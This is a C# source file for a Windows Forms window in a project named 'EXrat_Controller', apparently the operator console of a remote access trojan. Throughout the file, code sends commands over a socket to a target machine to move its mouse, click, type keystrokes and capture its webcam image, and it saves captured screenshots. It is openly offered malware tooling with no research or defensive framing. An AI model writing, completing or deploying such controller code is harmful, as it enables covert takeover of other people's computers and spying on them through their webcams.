using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace EXrat_Controller
{
    public partial class Form4 : Form
    {

        private readonly bool ImageRecieved = true;

        public bool Mouse_Control_Enabled = false;
        public bool Keyboard_Control_Enabled = false;
        public bool Webcam_Control_Enabled = false;
        public string Target_IP { get; set; }
        public int Target_Swidth { get; set; }
        public int Target_Sheight { get; set; }

        private readonly Image ImageSave;
        public Image PictureBoxImage
        {
            get => pictureBox1.Image;
            set => pictureBox1.Image = value;
        }
        public Form4()
        {

            InitializeComponent();
            SetStyle(ControlStyles.UserPaint, true);
            SetStyle(ControlStyles.AllPaintingInWmPaint, true);
            SetStyle(ControlStyles.DoubleBuffer, true);

        }

        private void Form4_Load(object sender, EventArgs e)
        {
            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
        }

        private void Form4_MouseMove(object sender, MouseEventArgs e)
        {
            if (Mouse_Control_Enabled) // ((ToolStripMenuItem)((ToolStripMenuItem)menuStrip1.Items[0]).DropDownItems[0]).Checked
            {
                Tuple<int, int> Coords = GetCoords(Target_Swidth, Target_Sheight);

                Form1.SocketToBW(Form1.connections, Target_IP).Write("!smp " + "\"" + Target_IP + "\" \"" + Coords.Item1 + "\" " + "\"" + Coords.Item2 + "\"");

            }

        }

        private void Form4_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (Keyboard_Control_Enabled)
            {
                Form1.SocketToBW(Form1.connections, Target_IP).Write("!keypress " + "\"" + Target_IP + "\" \"" + e.KeyChar.ToString() + "\"");

            }
        }
        public Tuple<int, int> GetCoords(int TargetWidth, int TargetHeight)
        {
            return new Tuple<int, int>(TargetWidth * PointToClient(Cursor.Position).X / ClientSize.Width, TargetHeight * PointToClient(Cursor.Position).Y / ClientSize.Height);
        }

        private void Form4_Click(object sender, EventArgs e)
        {
            if (Mouse_Control_Enabled)
            {
                if (((MouseEventArgs)e).Button == MouseButtons.Left)
                {
                    Form1.SocketToBW(Form1.connections, Target_IP).Write("!lc " + "\"" + Target_IP + "\"");
                }
                if (((MouseEventArgs)e).Button == MouseButtons.Right)
                {
                    Form1.SocketToBW(Form1.connections, Target_IP).Write("!rc " + "\"" + Target_IP + "\"");
                }
            }
        }

        private void MouseToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
        {
            Mouse_Control_Enabled = ((ToolStripMenuItem)sender).Checked;
        }

        private void KeyboardToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
        {
            Keyboard_Control_Enabled = ((ToolStripMenuItem)sender).Checked;
        }

        private void webcamPictureToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
        {
            Webcam_Control_Enabled = ((ToolStripMenuItem)sender).Checked;
            pictureBox1.Visible = Webcam_Control_Enabled;
            Form1.SocketToBW(Form1.connections, Target_IP).Write("!capture " + "\"" + Target_IP + "\"");
        }
        public static string GetIP()
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
            {

                socket.Connect("8.8.4.4", 5000);
                return ((IPEndPoint)socket.LocalEndPoint).Address.ToString();
            }
        }

        private void Form4_FormClosing(object sender, FormClosingEventArgs e)
        {
            Hide();
            e.Cancel = true;
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Image Picture = PictureBoxImage;
            SaveFileDialog SavePicture = new SaveFileDialog
            {
                FileName = "Screenshot.png",
                Filter = ""
            };
            string filter = "";
            foreach (ImageCodecInfo ICI in ImageCodecInfo.GetImageEncoders())
            {
                filter += string.Join("", ICI.CodecName.Skip(9)) + " (" + ICI.FilenameExtension + ") | " + ICI.FilenameExtension + "; | ";

            }
            filter = filter.Remove(filter.Length - 2, 2);
            SavePicture.Filter = filter;

            if (SavePicture.ShowDialog() == DialogResult.OK)
            {

                BackgroundImage.Save(SavePicture.FileName);
            }

        }
    }
}
